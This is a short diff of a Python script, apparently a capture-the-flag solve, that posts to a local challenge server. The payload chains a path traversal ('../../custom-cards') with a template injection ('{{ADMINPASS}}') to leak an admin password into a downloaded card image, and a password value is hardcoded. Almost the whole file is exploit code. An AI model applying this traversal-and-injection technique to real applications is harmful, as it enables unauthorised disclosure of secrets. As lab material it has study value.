@@ -1,10 +1,8 @@
-from requests import get,post
-from base64 import b64decode
+from requests import post
 url='http://127.0.0.1:1337'
 
 r=post(f'{url}/cards', data= {'image': '../../custom-cards?image=green.png&wish={{ADMINPASS}}&dummy=.png'}).content
 open('card.png', 'wb').write(r)
-
 
 # PASS = input('Pass>')
 PASS = 'GOD_INTERN!'
